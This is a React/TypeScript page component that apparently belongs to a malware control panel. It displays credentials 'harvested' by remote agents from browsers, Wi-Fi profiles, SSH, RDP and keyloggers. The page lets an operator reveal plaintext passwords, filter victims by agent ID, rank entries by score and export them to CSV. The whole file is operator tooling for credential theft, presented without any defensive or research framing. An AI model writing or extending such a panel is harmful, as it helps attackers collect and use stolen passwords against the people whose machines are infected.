import { useState } from 'react'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import {
  KeyRound, Search, Trash2, Download, Eye, EyeOff,
  RefreshCw, Filter, ShieldCheck, ShieldAlert, Shield,
} from 'lucide-react'
import { searchCredentials, deleteCredential, revealCredential } from '../api/credentials'
import type { Credential } from '../api/credentials'

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const CONF_STYLE: Record<string, string> = {
  high:   'badge-error',
  medium: 'badge-warning',
  low:    'badge-ghost',
}
const CONF_ICON: Record<string, JSX.Element> = {
  high:   <ShieldAlert size={12} className="text-red-400" />,
  medium: <Shield size={12} className="text-yellow-400" />,
  low:    <ShieldCheck size={12} className="text-gray-400" />,
}

const SOURCE_COLORS: Record<string, string> = {
  browser:  'badge-info',
  wifi:     'badge-warning',
  ssh:      'badge-success',
  rdp:      'badge-primary',
  system:   'badge-ghost',
  keylog:   'badge-error',
}

function ScoreBar({ score }: { score?: number }) {
  const pct = score ?? 0
  const color = pct >= 70 ? 'bg-red-500' : pct >= 40 ? 'bg-yellow-500' : 'bg-blue-500'
  return (
    <div className="flex items-center gap-1">
      <div className="w-16 h-1.5 bg-base-300 rounded-full overflow-hidden">
        <div className={`h-full rounded-full ${color}`} style={{ width: `${pct}%` }} />
      </div>
      <span className="text-xs opacity-50">{pct}</span>
    </div>
  )
}

// ---------------------------------------------------------------------------
// Main page
// ---------------------------------------------------------------------------

export default function Credentials() {
  const qc = useQueryClient()
  const [search, setSearch]     = useState('')
  const [agentId, setAgentId]   = useState('')
  const [source, setSource]     = useState('')
  const [minScore, setMinScore] = useState(0)
  const [revealed, setRevealed] = useState<Map<string, string>>(new Map())
  const [revealing, setRevealing] = useState<Set<string>>(new Set())
  const [selected, setSelected] = useState<Set<string>>(new Set())

  const params = {
    q: search || undefined,
    agent_id: agentId || undefined,
    source: source || undefined,
    min_score: minScore || undefined,
    limit: 200,
  }

  const { data: creds = [], isLoading, refetch } = useQuery({
    queryKey: ['credentials', params],
    queryFn: () => searchCredentials(params),
  })

  const doDelete = useMutation({
    mutationFn: (id: string) => deleteCredential(id),
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ['credentials'] })
      setSelected(prev => { const next = new Set(prev); return next })
    },
  })

  const toggleReveal = async (id: string) => {
    if (revealed.has(id)) {
      setRevealed(prev => { const next = new Map(prev); next.delete(id); return next })
      return
    }
    setRevealing(prev => new Set(prev).add(id))
    try {
      const data = await revealCredential(id)
      setRevealed(prev => new Map(prev).set(id, data.password ?? '(empty)'))
    } catch {
      setRevealed(prev => new Map(prev).set(id, '(error)'))
    } finally {
      setRevealing(prev => { const n = new Set(prev); n.delete(id); return n })
    }
  }

  const toggleSelect = (id: string) =>
    setSelected(prev => {
      const next = new Set(prev)
      next.has(id) ? next.delete(id) : next.add(id)
      return next
    })

  const toggleAll = () =>
    setSelected(prev => prev.size === creds.length ? new Set() : new Set(creds.map(c => c.id)))

  const handleExportCSV = () => {
    const rows = [
      ['ID', 'Agent', 'URL', 'Username', 'Source', 'Confidence', 'Score', 'Captured At'],
      ...creds
        .filter(c => selected.size === 0 || selected.has(c.id))
        .map(c => [c.id, c.agent_id, c.url || '', c.username, c.source, c.confidence, String(c.score ?? ''), c.captured_at]),
    ]
    const csv = rows.map(r => r.map(v => `"${v}"`).join(',')).join('\n')
    const blob = new Blob([csv], { type: 'text/csv' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url; a.download = 'credentials.csv'; a.click()
    URL.revokeObjectURL(url)
  }

  const sources = [...new Set(creds.map(c => c.source).filter(Boolean))]

  return (
    <div className="p-6 max-w-6xl mx-auto space-y-5">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold flex items-center gap-2">
            <KeyRound size={24} className="text-red-400" /> Credentials
          </h1>
          <p className="text-sm text-base-content/50 mt-1">
            {creds.length} harvested · sorted by score
          </p>
        </div>
        <div className="flex gap-2">
          <button onClick={() => refetch()} className="btn btn-ghost btn-sm"><RefreshCw size={14} /></button>
          <button onClick={handleExportCSV} className="btn btn-outline btn-sm gap-1">
            <Download size={14} /> Export CSV
          </button>
          {selected.size > 0 && (
            <button
              onClick={() => selected.forEach(id => doDelete.mutate(id))}
              className="btn btn-error btn-sm gap-1"
            >
              <Trash2 size={14} /> Delete ({selected.size})
            </button>
          )}
        </div>
      </div>

      {/* Filters */}
      <div className="bg-base-200 border border-base-300 rounded-xl p-4 space-y-3">
        <div className="flex items-center gap-2 text-sm font-semibold text-base-content/60">
          <Filter size={14} /> Filters
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
          <label className="flex items-center gap-2 input input-bordered input-sm">
            <Search size={14} className="opacity-40" />
            <input className="grow bg-transparent outline-none" placeholder="Search URL / user…"
              value={search} onChange={e => setSearch(e.target.value)} />
          </label>
          <input className="input input-bordered input-sm" placeholder="Filter by agent ID…"
            value={agentId} onChange={e => setAgentId(e.target.value)} />
          <select className="select select-bordered select-sm" value={source} onChange={e => setSource(e.target.value)}>
            <option value="">All sources</option>
            {sources.map(s => <option key={s} value={s}>{s}</option>)}
          </select>
          <label className="flex items-center gap-2 text-xs">
            <span className="opacity-50 shrink-0">Min score: {minScore}</span>
            <input type="range" min={0} max={100} step={10} className="range range-xs range-error flex-1"
              value={minScore} onChange={e => setMinScore(Number(e.target.value))} />
          </label>
        </div>
      </div>

      {/* Table */}
      {isLoading ? (
        <div className="flex justify-center py-12">
          <span className="loading loading-spinner loading-lg text-base-content/30" />
        </div>
      ) : creds.length === 0 ? (
        <div className="text-center py-16 text-base-content/30">
          <KeyRound size={40} className="mx-auto mb-3 opacity-30" />
          <p className="text-sm">No credentials found. They appear here after browser/wifi/keylog modules run.</p>
        </div>
      ) : (
        <div className="overflow-x-auto rounded-xl border border-base-300">
          <table className="table table-xs w-full">
            <thead className="bg-base-200">
              <tr>
                <th>
                  <input type="checkbox" className="checkbox checkbox-xs"
                    checked={selected.size === creds.length && creds.length > 0}
                    onChange={toggleAll} />
                </th>
                <th>URL / Host</th>
                <th>Username</th>
                <th>Password</th>
                <th>Source</th>
                <th>Confidence</th>
                <th>Score</th>
                <th>Agent</th>
                <th>Captured</th>
                <th></th>
              </tr>
            </thead>
            <tbody>
              {creds.map(c => (
                <tr key={c.id} className={`hover ${selected.has(c.id) ? 'bg-base-300/40' : ''}`}>
                  <td>
                    <input type="checkbox" className="checkbox checkbox-xs"
                      checked={selected.has(c.id)} onChange={() => toggleSelect(c.id)} />
                  </td>
                  <td className="max-w-[160px]">
                    <p className="font-mono text-xs truncate opacity-80">{c.url || c.hostname || '—'}</p>
                  </td>
                  <td>
                    <span className="font-mono text-xs">{c.username}</span>
                  </td>
                  <td>
                    <div className="flex items-center gap-1 max-w-[140px]">
                      <span className="font-mono text-xs truncate">
                        {revealed.has(c.id) ? revealed.get(c.id) : '••••••••'}
                      </span>
                      <button
                        onClick={() => toggleReveal(c.id)}
                        className="btn btn-ghost btn-xs p-0 shrink-0"
                        disabled={revealing.has(c.id)}
                      >
                        {revealing.has(c.id)
                          ? <span className="loading loading-spinner loading-xs" />
                          : revealed.has(c.id) ? <EyeOff size={11} /> : <Eye size={11} />}
                      </button>
                    </div>
                  </td>
                  <td>
                    <span className={`badge badge-xs ${SOURCE_COLORS[c.source] || 'badge-ghost'}`}>{c.source}</span>
                  </td>
                  <td>
                    <div className="flex items-center gap-1">
                      {CONF_ICON[c.confidence] || CONF_ICON.low}
                      <span className={`badge badge-xs ${CONF_STYLE[c.confidence] || ''}`}>{c.confidence}</span>
                    </div>
                  </td>
                  <td><ScoreBar score={c.score} /></td>
                  <td>
                    <span className="font-mono text-xs opacity-50">{c.agent_id?.slice(0, 8)}…</span>
                  </td>
                  <td className="text-xs opacity-40">
                    {new Date(c.captured_at).toLocaleDateString()}
                  </td>
                  <td>
                    <button onClick={() => doDelete.mutate(c.id)} className="btn btn-ghost btn-xs text-red-400">
                      <Trash2 size={11} />
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  )
}
